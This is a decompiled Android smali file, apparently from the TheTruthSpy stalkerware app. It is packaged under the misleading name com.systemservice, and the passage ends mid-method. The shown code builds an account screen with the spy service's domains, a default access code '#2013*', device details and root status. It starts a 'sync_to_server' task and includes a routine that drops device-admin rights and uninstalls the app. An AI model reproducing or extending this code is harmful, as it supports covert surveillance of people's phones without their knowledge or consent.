.class public Lcom/systemservice/UIConfigActivity;
.super Landroid/support/v7/app/AppCompatActivity;
.source ""


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/systemservice/UIConfigActivity$b;,
        Lcom/systemservice/UIConfigActivity$a;
    }
.end annotation


# instance fields
.field private A:Landroid/support/v7/widget/AppCompatTextView;

.field private B:Landroid/support/v7/widget/AppCompatTextView;

.field private C:Landroid/app/admin/DevicePolicyManager;

.field private D:Landroid/content/ComponentName;

.field E:Landroid/app/ProgressDialog;

.field private F:Landroid/view/View;

.field private G:Landroid/widget/RelativeLayout;

.field private H:Landroid/support/v7/widget/AppCompatButton;

.field private I:Landroid/content/SharedPreferences;

.field private J:Landroid/content/SharedPreferences$Editor;

.field private q:Landroid/support/v7/widget/AppCompatButton;

.field private r:Landroid/support/v7/widget/AppCompatButton;

.field private s:Landroid/support/v7/widget/AppCompatTextView;

.field private t:Landroid/support/v7/widget/AppCompatTextView;

.field private u:Landroid/support/v7/widget/AppCompatTextView;

.field private v:Landroid/support/v7/widget/AppCompatTextView;

.field private w:Landroid/support/v7/widget/AppCompatTextView;

.field private x:Landroid/support/v7/widget/AppCompatTextView;

.field private y:Landroid/support/v7/widget/AppCompatTextView;

.field private z:Landroid/support/v7/widget/AppCompatTextView;


# direct methods
.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/support/v7/app/AppCompatActivity;-><init>()V

    return-void
.end method

.method static synthetic a(Lcom/systemservice/UIConfigActivity;)Landroid/content/SharedPreferences$Editor;
    .locals 0

    iget-object p0, p0, Lcom/systemservice/UIConfigActivity;->J:Landroid/content/SharedPreferences$Editor;

    return-object p0
.end method

.method static synthetic b(Lcom/systemservice/UIConfigActivity;)Landroid/content/SharedPreferences;
    .locals 0

    iget-object p0, p0, Lcom/systemservice/UIConfigActivity;->I:Landroid/content/SharedPreferences;

    return-object p0
.end method

.method static synthetic c(Lcom/systemservice/UIConfigActivity;)Landroid/support/v7/widget/AppCompatTextView;
    .locals 0

    iget-object p0, p0, Lcom/systemservice/UIConfigActivity;->z:Landroid/support/v7/widget/AppCompatTextView;

    return-object p0
.end method

.method static synthetic d(Lcom/systemservice/UIConfigActivity;)Landroid/support/v7/widget/AppCompatTextView;
    .locals 0

    iget-object p0, p0, Lcom/systemservice/UIConfigActivity;->B:Landroid/support/v7/widget/AppCompatTextView;

    return-object p0
.end method


# virtual methods
.method public l()V
    .locals 4

    :try_start_0
    const-string v0, "device_policy"

    invoke-virtual {p0, v0}, Landroid/app/Activity;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/admin/DevicePolicyManager;

    iput-object v0, p0, Lcom/systemservice/UIConfigActivity;->C:Landroid/app/admin/DevicePolicyManager;

    new-instance v0, Landroid/content/ComponentName;

    const-class v1, Lcom/systemservice/common/boostReceiver/UIDeviceAdmin;

    invoke-direct {v0, p0, v1}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    iput-object v0, p0, Lcom/systemservice/UIConfigActivity;->D:Landroid/content/ComponentName;

    iget-object v0, p0, Lcom/systemservice/UIConfigActivity;->C:Landroid/app/admin/DevicePolicyManager;

    iget-object v1, p0, Lcom/systemservice/UIConfigActivity;->D:Landroid/content/ComponentName;

    invoke-virtual {v0, v1}, Landroid/app/admin/DevicePolicyManager;->isAdminActive(Landroid/content/ComponentName;)Z

    move-result v0

    if-eqz v0, :cond_0

    iget-object v0, p0, Lcom/systemservice/UIConfigActivity;->C:Landroid/app/admin/DevicePolicyManager;

    iget-object v1, p0, Lcom/systemservice/UIConfigActivity;->D:Landroid/content/ComponentName;

    invoke-virtual {v0, v1}, Landroid/app/admin/DevicePolicyManager;->removeActiveAdmin(Landroid/content/ComponentName;)V

    sget-object v0, Lcom/systemservice/a/a/j;->h:Lorg/apache/log4j/Logger;

    const-string v1, "removeActiveAdmin"

    invoke-virtual {v0, v1}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    :cond_0
    const-wide/16 v0, 0x1f4

    :try_start_1
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    :try_start_2
    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    :goto_0
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "package:"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0}, Landroid/app/Activity;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-virtual {v1}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v0

    new-instance v1, Landroid/content/Intent;

    const-string v2, "android.intent.action.DELETE"

    invoke-direct {v1, v2, v0}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    invoke-virtual {p0, v1}, Landroid/app/Activity;->startActivity(Landroid/content/Intent;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    goto :goto_1

    :catch_1
    move-exception v0

    sget-object v1, Lcom/systemservice/a/a/j;->h:Lorg/apache/log4j/Logger;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v3, ""

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Lorg/apache/log4j/Category;->error(Ljava/lang/Object;)V

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v1, "actionUninstall"

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :goto_1
    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 17

    move-object/from16 v1, p0

    const-string v2, "9.43"

    const-string v0, "thetruthspy.com"

    const-string v3, "access-code"

    const-string v4, " "

    const-string v5, "UnKnow"

    const-string v6, "#2013*"

    const-string v7, ""

    invoke-super/range {p0 .. p1}, Landroid/support/v7/app/AppCompatActivity;->onCreate(Landroid/os/Bundle;)V

    const v8, 0x7f0c001d

    invoke-virtual {v1, v8}, Landroid/support/v7/app/AppCompatActivity;->setContentView(I)V

    const-string v8, "UIConfigActivity"

    invoke-static {v8}, Lcom/systemservice/a/e/m;->a(Ljava/lang/String;)Lorg/apache/log4j/Logger;

    move-result-object v8

    sput-object v8, Lcom/systemservice/a/a/j;->h:Lorg/apache/log4j/Logger;

    const-string v8, "Account"

    invoke-virtual {v1, v8}, Landroid/app/Activity;->setTitle(Ljava/lang/CharSequence;)V

    :try_start_0
    invoke-virtual/range {p0 .. p0}, Landroid/app/Activity;->getApplicationContext()Landroid/content/Context;

    move-result-object v8

    const-string v9, "app_prefs_settings"

    const/4 v10, 0x0

    invoke-virtual {v8, v9, v10}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v8

    iput-object v8, v1, Lcom/systemservice/UIConfigActivity;->I:Landroid/content/SharedPreferences;

    iget-object v8, v1, Lcom/systemservice/UIConfigActivity;->I:Landroid/content/SharedPreferences;

    invoke-interface {v8}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v8

    iput-object v8, v1, Lcom/systemservice/UIConfigActivity;->J:Landroid/content/SharedPreferences$Editor;

    iget-object v8, v1, Lcom/systemservice/UIConfigActivity;->J:Landroid/content/SharedPreferences$Editor;

    invoke-interface {v8}, Landroid/content/SharedPreferences$Editor;->apply()V

    const v8, 0x7f09013c

    invoke-virtual {v1, v8}, Landroid/support/v7/app/AppCompatActivity;->findViewById(I)Landroid/view/View;

    move-result-object v8

    iput-object v8, v1, Lcom/systemservice/UIConfigActivity;->F:Landroid/view/View;

    const v8, 0x7f0900be

    invoke-virtual {v1, v8}, Landroid/support/v7/app/AppCompatActivity;->findViewById(I)Landroid/view/View;

    move-result-object v8

    check-cast v8, Landroid/widget/RelativeLayout;

    iput-object v8, v1, Lcom/systemservice/UIConfigActivity;->G:Landroid/widget/RelativeLayout;

    const v8, 0x7f09002b

    invoke-virtual {v1, v8}, Landroid/support/v7/app/AppCompatActivity;->findViewById(I)Landroid/view/View;

    move-result-object v8

    check-cast v8, Landroid/support/v7/widget/AppCompatButton;

    iput-object v8, v1, Lcom/systemservice/UIConfigActivity;->H:Landroid/support/v7/widget/AppCompatButton;

    const v8, 0x7f0900c0

    invoke-virtual {v1, v8}, Landroid/support/v7/app/AppCompatActivity;->findViewById(I)Landroid/view/View;

    move-result-object v8

    check-cast v8, Landroid/widget/RelativeLayout;

    const v8, 0x7f090126

    invoke-virtual {v1, v8}, Landroid/support/v7/app/AppCompatActivity;->findViewById(I)Landroid/view/View;

    move-result-object v8

    check-cast v8, Landroid/support/v7/widget/AppCompatTextView;

    const v9, 0x7f09002d

    invoke-virtual {v1, v9}, Landroid/support/v7/app/AppCompatActivity;->findViewById(I)Landroid/view/View;

    move-result-object v9

    check-cast v9, Landroid/support/v7/widget/AppCompatButton;

    const v11, 0x7f0d0064

    invoke-virtual {v1, v11}, Landroid/app/Activity;->getString(I)Ljava/lang/String;

    move-result-object v11

    new-instance v12, Ljava/lang/StringBuilder;

    invoke-direct {v12}, Ljava/lang/StringBuilder;-><init>()V

    const v13, 0x7f0d0063

    invoke-virtual {v1, v13}, Landroid/app/Activity;->getString(I)Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v12, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v13, "https://support.thetruthspy.com"

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v13, "<br/><i>"

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const v13, 0x7f0d00c0

    invoke-virtual {v1, v13}, Landroid/app/Activity;->getString(I)Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v13, "</i>"

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v12}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v12

    sget v13, Landroid/os/Build$VERSION;->SDK_INT:I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_3

    const/16 v14, 0x18

    const-string v15, "</font>"

    const-string v10, "</big></font><br/><font color=\"#757575\">"

    move-object/from16 v16, v4

    const-string v4, "<font color=\"#212121\"><big>"

    if-lt v13, v14, :cond_0

    :try_start_1
    new-instance v13, Ljava/lang/StringBuilder;

    invoke-direct {v13, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v13, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v13, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v13, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v13, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v13}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    const/4 v10, 0x0

    invoke-static {v4, v10}, Landroid/text/Html;->fromHtml(Ljava/lang/String;I)Landroid/text/Spanned;

    move-result-object v4

    :goto_0
    invoke-virtual {v8, v4}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    goto :goto_1

    :cond_0
    new-instance v13, Ljava/lang/StringBuilder;

    invoke-direct {v13, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v13, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v13, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v13, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v13, v15}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v13}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Landroid/text/Html;->fromHtml(Ljava/lang/String;)Landroid/text/Spanned;

    move-result-object v4

    goto :goto_0

    :goto_1
    new-instance v4, Lcom/systemservice/a;

    invoke-direct {v4, v1}, Lcom/systemservice/a;-><init>(Lcom/systemservice/UIConfigActivity;)V

    invoke-virtual {v9, v4}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    const v4, 0x7f09011b

    invoke-virtual {v1, v4}, Landroid/support/v7/app/AppCompatActivity;->findViewById(I)Landroid/view/View;

    move-result-object v4

    check-cast v4, Landroid/support/v7/widget/AppCompatTextView;

    iput-object v4, v1, Lcom/systemservice/UIConfigActivity;->s:Landroid/support/v7/widget/AppCompatTextView;

    const v4, 0x7f090122

    invoke-virtual {v1, v4}, Landroid/support/v7/app/AppCompatActivity;->findViewById(I)Landroid/view/View;

    move-result-object v4

    check-cast v4, Landroid/support/v7/widget/AppCompatTextView;

    iput-object v4, v1, Lcom/systemservice/UIConfigActivity;->t:Landroid/support/v7/widget/AppCompatTextView;

    const v4, 0x7f090121

    invoke-virtual {v1, v4}, Landroid/support/v7/app/AppCompatActivity;->findViewById(I)Landroid/view/View;

    move-result-object v4

    check-cast v4, Landroid/support/v7/widget/AppCompatTextView;

    iput-object v4, v1, Lcom/systemservice/UIConfigActivity;->u:Landroid/support/v7/widget/AppCompatTextView;

    const v4, 0x7f09011e

    invoke-virtual {v1, v4}, Landroid/support/v7/app/AppCompatActivity;->findViewById(I)Landroid/view/View;

    move-result-object v4

    check-cast v4, Landroid/support/v7/widget/AppCompatTextView;

    iput-object v4, v1, Lcom/systemservice/UIConfigActivity;->v:Landroid/support/v7/widget/AppCompatTextView;

    const v4, 0x7f09011d

    invoke-virtual {v1, v4}, Landroid/support/v7/app/AppCompatActivity;->findViewById(I)Landroid/view/View;

    move-result-object v4

    check-cast v4, Landroid/support/v7/widget/AppCompatTextView;

    iput-object v4, v1, Lcom/systemservice/UIConfigActivity;->w:Landroid/support/v7/widget/AppCompatTextView;

    const v4, 0x7f09011f

    invoke-virtual {v1, v4}, Landroid/support/v7/app/AppCompatActivity;->findViewById(I)Landroid/view/View;

    move-result-object v4

    check-cast v4, Landroid/support/v7/widget/AppCompatTextView;

    iput-object v4, v1, Lcom/systemservice/UIConfigActivity;->x:Landroid/support/v7/widget/AppCompatTextView;

    const v4, 0x7f090120

    invoke-virtual {v1, v4}, Landroid/support/v7/app/AppCompatActivity;->findViewById(I)Landroid/view/View;

    move-result-object v4

    check-cast v4, Landroid/support/v7/widget/AppCompatTextView;

    iput-object v4, v1, Lcom/systemservice/UIConfigActivity;->y:Landroid/support/v7/widget/AppCompatTextView;

    const v4, 0x7f09011a

    invoke-virtual {v1, v4}, Landroid/support/v7/app/AppCompatActivity;->findViewById(I)Landroid/view/View;

    move-result-object v4

    check-cast v4, Landroid/support/v7/widget/AppCompatTextView;

    iput-object v4, v1, Lcom/systemservice/UIConfigActivity;->z:Landroid/support/v7/widget/AppCompatTextView;

    const v4, 0x7f09011c

    invoke-virtual {v1, v4}, Landroid/support/v7/app/AppCompatActivity;->findViewById(I)Landroid/view/View;

    move-result-object v4

    check-cast v4, Landroid/support/v7/widget/AppCompatTextView;

    iput-object v4, v1, Lcom/systemservice/UIConfigActivity;->A:Landroid/support/v7/widget/AppCompatTextView;

    const v4, 0x7f090124

    invoke-virtual {v1, v4}, Landroid/support/v7/app/AppCompatActivity;->findViewById(I)Landroid/view/View;

    move-result-object v4

    check-cast v4, Landroid/support/v7/widget/AppCompatTextView;

    iput-object v4, v1, Lcom/systemservice/UIConfigActivity;->B:Landroid/support/v7/widget/AppCompatTextView;

    iget-object v4, v1, Lcom/systemservice/UIConfigActivity;->B:Landroid/support/v7/widget/AppCompatTextView;

    const v8, 0x7f0d005c

    const/4 v9, 0x1

    new-array v10, v9, [Ljava/lang/Object;

    iget-object v11, v1, Lcom/systemservice/UIConfigActivity;->I:Landroid/content/SharedPreferences;

    invoke-interface {v11, v3, v6}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    const/4 v12, 0x0

    aput-object v11, v10, v12

    invoke-virtual {v1, v8, v10}, Landroid/app/Activity;->getString(I[Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v4, v8}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    const v4, 0x7f090036

    invoke-virtual {v1, v4}, Landroid/support/v7/app/AppCompatActivity;->findViewById(I)Landroid/view/View;

    move-result-object v4

    check-cast v4, Landroid/support/v7/widget/AppCompatButton;

    iput-object v4, v1, Lcom/systemservice/UIConfigActivity;->r:Landroid/support/v7/widget/AppCompatButton;

    sget v4, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v8, 0x1d

    if-lt v4, v8, :cond_1

    iget-object v4, v1, Lcom/systemservice/UIConfigActivity;->F:Landroid/view/View;

    const/4 v8, 0x0

    invoke-virtual {v4, v8}, Landroid/view/View;->setVisibility(I)V

    iget-object v4, v1, Lcom/systemservice/UIConfigActivity;->G:Landroid/widget/RelativeLayout;

    invoke-virtual {v4, v8}, Landroid/widget/RelativeLayout;->setVisibility(I)V

    iget-object v4, v1, Lcom/systemservice/UIConfigActivity;->H:Landroid/support/v7/widget/AppCompatButton;

    invoke-virtual {v4, v8}, Landroid/widget/Button;->setVisibility(I)V

    iget-object v4, v1, Lcom/systemservice/UIConfigActivity;->B:Landroid/support/v7/widget/AppCompatTextView;

    const v8, 0x7f0d005b

    new-array v9, v9, [Ljava/lang/Object;

    iget-object v10, v1, Lcom/systemservice/UIConfigActivity;->I:Landroid/content/SharedPreferences;

    invoke-interface {v10, v3, v6}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const/4 v10, 0x0

    aput-object v3, v9, v10

    invoke-virtual {v1, v8, v9}, Landroid/app/Activity;->getString(I[Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v4, v3}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    iget-object v3, v1, Lcom/systemservice/UIConfigActivity;->r:Landroid/support/v7/widget/AppCompatButton;

    invoke-virtual/range {p0 .. p0}, Landroid/support/v7/app/AppCompatActivity;->getResources()Landroid/content/res/Resources;

    move-result-object v4

    const v8, 0x7f0d0066

    invoke-virtual {v4, v8}, Landroid/content/res/Resources;->getString(I)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Landroid/widget/Button;->setText(Ljava/lang/CharSequence;)V

    iget-object v3, v1, Lcom/systemservice/UIConfigActivity;->H:Landroid/support/v7/widget/AppCompatButton;

    new-instance v4, Lcom/systemservice/b;

    invoke-direct {v4, v1}, Lcom/systemservice/b;-><init>(Lcom/systemservice/UIConfigActivity;)V

    invoke-virtual {v3, v4}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    :cond_1
    iget-object v3, v1, Lcom/systemservice/UIConfigActivity;->r:Landroid/support/v7/widget/AppCompatButton;

    new-instance v4, Lcom/systemservice/c;

    invoke-direct {v4, v1}, Lcom/systemservice/c;-><init>(Lcom/systemservice/UIConfigActivity;)V

    invoke-virtual {v3, v4}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    const v3, 0x7f09002e

    invoke-virtual {v1, v3}, Landroid/support/v7/app/AppCompatActivity;->findViewById(I)Landroid/view/View;

    move-result-object v3

    check-cast v3, Landroid/support/v7/widget/AppCompatButton;

    iput-object v3, v1, Lcom/systemservice/UIConfigActivity;->q:Landroid/support/v7/widget/AppCompatButton;

    iget-object v3, v1, Lcom/systemservice/UIConfigActivity;->q:Landroid/support/v7/widget/AppCompatButton;

    new-instance v4, Lcom/systemservice/d;

    invoke-direct {v4, v1}, Lcom/systemservice/d;-><init>(Lcom/systemservice/UIConfigActivity;)V

    invoke-virtual {v3, v4}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    iget-object v3, v1, Lcom/systemservice/UIConfigActivity;->t:Landroid/support/v7/widget/AppCompatTextView;

    invoke-virtual {v3, v0}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    iget-object v3, v1, Lcom/systemservice/UIConfigActivity;->u:Landroid/support/v7/widget/AppCompatTextView;

    const-string v4, "my.thetruthspy.com"

    invoke-virtual {v3, v4}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    iget-object v3, v1, Lcom/systemservice/UIConfigActivity;->A:Landroid/support/v7/widget/AppCompatTextView;

    invoke-virtual {v3, v2}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    iget-object v3, v1, Lcom/systemservice/UIConfigActivity;->s:Landroid/support/v7/widget/AppCompatTextView;

    iget-object v4, v1, Lcom/systemservice/UIConfigActivity;->I:Landroid/content/SharedPreferences;

    const-string v8, "username"

    invoke-interface {v4, v8, v7}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    iget-object v3, v1, Lcom/systemservice/UIConfigActivity;->t:Landroid/support/v7/widget/AppCompatTextView;

    invoke-virtual {v3, v0}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_3

    :try_start_2
    sget-object v0, Landroid/os/Build;->MODEL:Ljava/lang/String;
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    goto :goto_2

    :catch_0
    move-exception v0

    move-object v3, v0

    :try_start_3
    sget-object v0, Lcom/systemservice/a/a/j;->h:Lorg/apache/log4j/Logger;

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v3}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v4, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, v3}, Lorg/apache/log4j/Category;->error(Ljava/lang/Object;)V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_3

    :try_start_4
    sget-object v0, Landroid/os/Build;->MANUFACTURER:Ljava/lang/String;
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_1

    goto :goto_2

    :catch_1
    move-object v0, v5

    :goto_2
    :try_start_5
    sget-object v3, Landroid/os/Build;->MANUFACTURER:Ljava/lang/String;

    if-eqz v3, :cond_2

    iget-object v4, v1, Lcom/systemservice/UIConfigActivity;->w:Landroid/support/v7/widget/AppCompatTextView;

    invoke-virtual {v4, v3}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    goto :goto_3

    :cond_2
    iget-object v3, v1, Lcom/systemservice/UIConfigActivity;->w:Landroid/support/v7/widget/AppCompatTextView;

    invoke-virtual {v3, v5}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    :goto_3
    iget-object v3, v1, Lcom/systemservice/UIConfigActivity;->v:Landroid/support/v7/widget/AppCompatTextView;

    invoke-virtual {v3, v0}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    iget-object v0, v1, Lcom/systemservice/UIConfigActivity;->I:Landroid/content/SharedPreferences;

    const-string v3, "is_device_rooted"

    const/4 v4, 0x0

    invoke-interface {v0, v3, v4}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v0

    if-eqz v0, :cond_3

    iget-object v0, v1, Lcom/systemservice/UIConfigActivity;->x:Landroid/support/v7/widget/AppCompatTextView;

    invoke-virtual/range {p0 .. p0}, Landroid/support/v7/app/AppCompatActivity;->getResources()Landroid/content/res/Resources;

    move-result-object v3

    const v4, 0x7f0d00d9

    invoke-virtual {v3, v4}, Landroid/content/res/Resources;->getString(I)Ljava/lang/String;

    move-result-object v3

    :goto_4
    invoke-virtual {v0, v3}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    goto :goto_5

    :cond_3
    iget-object v0, v1, Lcom/systemservice/UIConfigActivity;->x:Landroid/support/v7/widget/AppCompatTextView;

    invoke-virtual/range {p0 .. p0}, Landroid/support/v7/app/AppCompatActivity;->getResources()Landroid/content/res/Resources;

    move-result-object v3

    const v4, 0x7f0d0096

    invoke-virtual {v3, v4}, Landroid/content/res/Resources;->getString(I)Ljava/lang/String;

    move-result-object v3

    goto :goto_4

    :goto_5
    const-string v0, "Android"
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_3

    :try_start_6
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-object/from16 v4, v16

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v0, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_2

    :catch_2
    :try_start_7
    iget-object v0, v1, Lcom/systemservice/UIConfigActivity;->y:Landroid/support/v7/widget/AppCompatTextView;

    invoke-virtual {v0, v5}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    iget-object v0, v1, Lcom/systemservice/UIConfigActivity;->z:Landroid/support/v7/widget/AppCompatTextView;

    invoke-virtual {v0, v6}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    iget-object v0, v1, Lcom/systemservice/UIConfigActivity;->A:Landroid/support/v7/widget/AppCompatTextView;

    invoke-virtual {v0, v2}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    new-instance v0, Lcom/systemservice/UIConfigActivity$a;

    const/4 v2, 0x0

    invoke-direct {v0, v1, v2}, Lcom/systemservice/UIConfigActivity$a;-><init>(Lcom/systemservice/UIConfigActivity;Lcom/systemservice/a;)V

    const-string v2, "sync_to_server"

    filled-new-array {v2}, [Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Landroid/os/AsyncTask;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_3

    goto :goto_6

    :catch_3
    move-exception v0

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

